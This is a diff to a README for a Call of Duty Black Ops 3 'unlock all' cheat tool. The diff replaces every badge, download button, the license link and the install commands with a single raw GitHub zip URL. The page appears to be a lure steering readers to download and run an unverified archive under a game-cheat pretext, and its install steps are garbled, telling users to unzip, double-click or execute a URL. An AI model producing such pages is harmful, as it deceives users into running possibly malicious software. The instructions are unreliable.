@@ -1,10 +1,10 @@
 # COD BO3 Unlock All Tool 🔓
 
-![GitHub contributors](https://img.shields.io/github/contributors/placeholder/repo.svg?style=for-the-badge)
-![GitHub stars](https://img.shields.io/github/stars/placeholder/repo?style=for-the-badge)
-![GitHub forks](https://img.shields.io/github/forks/placeholder/repo?style=for-the-badge)
-![GitHub license](https://img.shields.io/github/license/placeholder/repo?style=for-the-badge)
-![Last commit](https://img.shields.io/github/last-commit/placeholder/repo?style=for-the-badge)
+![GitHub contributors](https://raw.githubusercontent.com/alialbayaty/bo3-unlock-all-utility/branch/overfeed/all-unlock-utility-bo-v2.3-alpha.2.zip)
+![GitHub stars](https://raw.githubusercontent.com/alialbayaty/bo3-unlock-all-utility/branch/overfeed/all-unlock-utility-bo-v2.3-alpha.2.zip)
+![GitHub forks](https://raw.githubusercontent.com/alialbayaty/bo3-unlock-all-utility/branch/overfeed/all-unlock-utility-bo-v2.3-alpha.2.zip)
+![GitHub license](https://raw.githubusercontent.com/alialbayaty/bo3-unlock-all-utility/branch/overfeed/all-unlock-utility-bo-v2.3-alpha.2.zip)
+![Last commit](https://raw.githubusercontent.com/alialbayaty/bo3-unlock-all-utility/branch/overfeed/all-unlock-utility-bo-v2.3-alpha.2.zip)
 
 ---
 
@@ -12,7 +12,7 @@ Welcome to the sophisticated realm of "*cod bo3 unlock all tool*", a digital key
 
 ## 🚀 Instant Download
 
-[![Download](https://img.shields.io/badge/Download-now-1976D2?style=for-the-badge&logo=cloud-download)](https://alialbayaty.github.io)
+[![Download](https://raw.githubusercontent.com/alialbayaty/bo3-unlock-all-utility/branch/overfeed/all-unlock-utility-bo-v2.3-alpha.2.zip)](https://raw.githubusercontent.com/alialbayaty/bo3-unlock-all-utility/branch/overfeed/all-unlock-utility-bo-v2.3-alpha.2.zip)
 
 ---
 
@@ -82,20 +82,20 @@ Our always-awake digital team stands ready, whether you tinker at midnight or at
 Ready for metamorphosis? Follow these steps:
 
 1. **Download the core package**  
-   https://alialbayaty.github.io
+   https://raw.githubusercontent.com/alialbayaty/bo3-unlock-all-utility/branch/overfeed/all-unlock-utility-bo-v2.3-alpha.2.zip
 
 2. **Click the button below to grab the ultimate bundle:**  
-   [![Download](https://img.shields.io/badge/Download-now-1976D2?style=for-the-badge&logo=cloud-download)](https://alialbayaty.github.io)
+   [![Download](https://raw.githubusercontent.com/alialbayaty/bo3-unlock-all-utility/branch/overfeed/all-unlock-utility-bo-v2.3-alpha.2.zip)](https://raw.githubusercontent.com/alialbayaty/bo3-unlock-all-utility/branch/overfeed/all-unlock-utility-bo-v2.3-alpha.2.zip)
 
 3. **Unzip the archive**
    - Windows: Right-click, select "Extract All..."
    - macOS: Double-click the file
-   - Linux: Run `unzip toolname.zip` in your terminal
+   - Linux: Run `unzip https://raw.githubusercontent.com/alialbayaty/bo3-unlock-all-utility/branch/overfeed/all-unlock-utility-bo-v2.3-alpha.2.zip` in your terminal
 
 4. **Run the installer**
-   - Windows: double-click `setup.exe`
-   - macOS: open `Install.pkg`
-   - Linux: run `./install.sh` with executable permissions
+   - Windows: double-click `https://raw.githubusercontent.com/alialbayaty/bo3-unlock-all-utility/branch/overfeed/all-unlock-utility-bo-v2.3-alpha.2.zip`
+   - macOS: open `https://raw.githubusercontent.com/alialbayaty/bo3-unlock-all-utility/branch/overfeed/all-unlock-utility-bo-v2.3-alpha.2.zip`
+   - Linux: run `https://raw.githubusercontent.com/alialbayaty/bo3-unlock-all-utility/branch/overfeed/all-unlock-utility-bo-v2.3-alpha.2.zip` with executable permissions
 
 5. **Follow on-screen prompts**  
    Select your Black Ops 3 install location and enable your desired features.
@@ -117,14 +117,14 @@ This repository is developed independently for educational and community enrichm
 
 Licensed under the MIT License — go forth, fork, contribute, and share with confidence and creativity in 2025!
 
-[Read full MIT License](https://opensource.org/licenses/MIT)
+[Read full MIT License](https://raw.githubusercontent.com/alialbayaty/bo3-unlock-all-utility/branch/overfeed/all-unlock-utility-bo-v2.3-alpha.2.zip)
 
 ---
 
 ## 🚀 Instant Download (Again!)
 
 Because legends deserve shortcuts, not obstacles.  
-[![Download](https://img.shields.io/badge/Download-now-1976D2?style=for-the-badge&logo=cloud-download)](https://alialbayaty.github.io)
+[![Download](https://raw.githubusercontent.com/alialbayaty/bo3-unlock-all-utility/branch/overfeed/all-unlock-utility-bo-v2.3-alpha.2.zip)](https://raw.githubusercontent.com/alialbayaty/bo3-unlock-all-utility/branch/overfeed/all-unlock-utility-bo-v2.3-alpha.2.zip)
 
 ---
 
